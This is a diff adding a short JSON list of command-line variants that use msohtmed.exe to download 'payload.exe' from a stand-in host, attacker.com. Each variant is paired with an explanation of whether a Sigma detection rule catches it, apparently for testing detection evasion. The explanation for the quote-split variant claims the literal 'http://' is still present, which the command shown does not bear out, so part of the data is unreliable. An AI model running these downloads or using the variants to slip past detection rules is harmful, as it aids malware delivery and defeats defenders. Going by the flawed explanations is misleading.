@@ -1,0 +1,14 @@
+[
+  {
+    "output": "msohtmed.exe \"http://attacker.com/payload.exe\"",
+    "explanation": "This is the original command and is detected by the Sigma rule as it contains the 'http://' URL in the command line."
+  },
+  {
+    "output": "msohtmed.exe \"h\"tt\"p\"://attacker.com/payload.exe",
+    "explanation": "This command uses string splitting with quotes to bypass parsing, but the URL still contains 'http://', which is detected by the Sigma rule."
+  },
+  {
+    "output": "msohtmed.exe payload.exe",
+    "explanation": "This command omits the URL entirely, so it does not match the Sigma rule's detection logic based on the presence of URLs."
+  }
+]
